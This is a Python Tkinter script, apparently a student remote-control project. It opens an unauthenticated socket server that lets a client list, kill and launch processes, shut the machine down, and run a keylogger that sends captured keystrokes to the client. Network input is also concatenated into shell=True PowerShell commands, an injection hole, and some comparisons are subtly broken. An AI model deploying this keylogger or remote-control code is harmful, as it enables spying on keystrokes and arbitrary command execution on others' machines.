def Server_Running():
    #Bật server lên
    import socket
    HOST = ''  
    PORT = 1233
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    HOST = str(ip_address)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(2)
    print(HOST,PORT)
    client, addr = server.accept()
    print('Connected by', addr)



    #Function cho server:
    def App_running(HOST, PORT):
        import subprocess
        cmd = 'powershell "Get-Process |where {$_.mainWindowTItle} |Select-Object id, name, @{Name=\'ThreadCount\';Expression ={$_.Threads.Count}}| format-table'
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        '''for line in proc.stdout:
            if line.rstrip():
                print(line.decode().rstrip().lstrip())'''
        count = 0
        size = 0
        list_name = ['' for i in range(100)]
        list_id = ['' for i in range(100)]
        list_thread = ['' for i in range(100)]
        for line in proc.stdout:
            if line.rstrip():
                if count < 2:
                    count += 1
                    continue
                str_line = str(line.decode().rstrip().lstrip())
                str_line = " ".join(str_line.split())
                list_id_name_thread = str_line.split(" ", 3)
                list_thread[size] = list_id_name_thread[2]
                list_name[size] = list_id_name_thread[1]
                list_id[size] = list_id_name_thread[0]
                size += 1

        client.sendall(bytes(str(size),"utf8"))

        for i in range(size):
            client.sendall(bytes(list_id[i],"utf8"))
            check = client.recv(1024)

        for i in range(size):
            client.sendall(bytes(list_name[i], "utf8"))
            check = client.recv(1024)
            
        for i in range(size):
            client.sendall(bytes(list_thread[i], "utf8"))
            check = client.recv(1024)
    def App_running_kill(ID_App):
        import subprocess
        cmd = 'powershell taskkill /F /PID ' + ID_App
        try:
            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
            return 1
        except:
            return 0
    def App_start(Name):
        import subprocess
        cmd = 'powershell start ' + Name
        try:
            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
            return 1
        except:
            return 0

            
    def hook():
        from threading import Thread
        import threading
        import pynput
        import time
        from pynput.keyboard import Key, Listener, Controller
        keyboard = Controller()
        keys = []
        KeyStop = True
        def Stop():
            nonlocal KeyStop
            if KeyStop == True:
                try:
                    while True:                       
                        check = client.recv(1024).decode("utf8")
                        print(check)
                        if check == "Unhook Key" or check =="Xem key":                 
                            KeyStop = False
                            break
                finally:
                    keyboard.release(Key.space)

        t1 = threading.Thread(target=Stop)
        def KeyLogger():
            def on_press(key):
                nonlocal keys
                keys.append(key)
            def on_release(key):
                if KeyStop == False: listener.stop()
            with Listener(on_release = on_release, on_press = on_press) as listener:
                t1.join()
                listener.join()
            def write(keys):
                global count
                count = 0
                keylog = ''
                for key in keys:
                    k = str(key).replace("'","")
                    if(str(k) == "Key.backspace"):
                        k = "Backspace"
                    elif(str(k) == "Key.space"):
                        k = " "                
                    k = str(k).replace("Key.cmd","")                    
                    k = str(k).replace("Key.","")
                    k = str(k).replace("<","")
                    k = str(k).replace(">","")
                    if(str(k) == 96):
                        k = "0"
                    elif(str(k) == 97):
                        k = "1"
                    elif(str(k) == 98):
                        k = "2"
                    elif(str(k) == 99):
                        k = "3"
                    elif(str(k) == 100):
                        k = "4"
                    elif(str(k) == 101):
                        k = "5"
                    elif(str(k) == 102):
                        k = "6"
                    elif(str(k) == 103):
                        k = "7"
                    elif(str(k) == 104):
                        k = "8"
                    elif(str(k) == 105):
                        k = "9"
                    k = str(k).replace("cmd","fn")
                    k = str(k).replace("enter","Enter")
                    k = str(k).replace("tab","")
                    k = str(k).replace("esc","ESC")
                    k = str(k).replace("num_lock","")
                    k = str(k).replace("caps_lock","")
                    k = str(k).replace("shift_l","")
                    k = str(k).replace("shift_r","")
                    k = str(k).replace("ctrl_l","")
                    k = str(k).replace("ctrl_r","")
                    k = str(k).replace("alt_l","")
                    k = str(k).replace("alt_gr","")
                    k = str(k).replace("delete","Del")
                    k = str(k).replace("print_screen","PrtSc")
                    k = str(k).replace("home","Home")

                    keylog += k
                    count+=1
                return keylog[0:]
            data = write(keys)
            print(data)
            client.sendall(bytes(str(count),"utf8"))
            client.sendall(bytes(data,"utf8"))
            check = client.recv(1024).decode("utf8")
            keys.clear()
            
        t2 = threading.Thread(target=KeyLogger)
        t1.start()
        t2.start()

    def Recieve_Close():
        import os
        os.system('shutdown -s -t "time"')
        #time la thoi gian set up tat may tuy y
    #Command cho server:
    while True:
        #try:
        def Command_catch(i):
            if i == "Xem App": App_running(HOST,PORT)
            elif i == "Xoa App": 
                ID_App = client.recv(1024).decode("utf8") 
                App_running_kill(ID_App)
            elif i == "Bat App":
                Name = client.recv(1024).decode("utf8")
                App_start(Name)
            elif i == "Hook Key": hook()
            elif i == "Shutdown" : Recieve_Close()

        Command = client.recv(1024).decode("utf8")
        client.sendall(bytes("OK","utf8"))
        print(Command)
        Command_catch(Command)
        #except:
            #print("Disconnected")
            #break
    server.close()

    
from tkinter import *
from tkinter import messagebox

mainWin = Tk()
mainWin.title("SERVER")
mainWin.geometry("200x200")
Start = Button(
        mainWin,
        text = "Khởi động server",
        width = 20,
        height = 10,
        borderwidth=5,
        command = Server_Running
    ).pack()



mainWin.mainloop()